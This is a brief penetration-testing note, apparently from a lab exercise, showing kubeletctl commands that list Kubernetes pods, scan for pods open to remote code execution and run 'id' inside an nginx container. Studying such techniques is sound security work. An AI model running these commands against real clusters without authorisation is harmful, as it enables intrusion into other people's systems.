When dealing with Kurbenetes, we can use the tool Kubeletctl the enumerate Kerbenetes that we are dealing with:

Extracting Pods information with Kubeletctl:
```
kubeletctl -i --server 10.129.10.11 pods
```

Scan for pods that we can exploit RCE on:
```
kubeletctl -i --server <serverip> scan rce
```
Executing command with Kubeletctl:
```
kubeletctl -i --server <serverip> exec "id" -p nginx -c nginx
```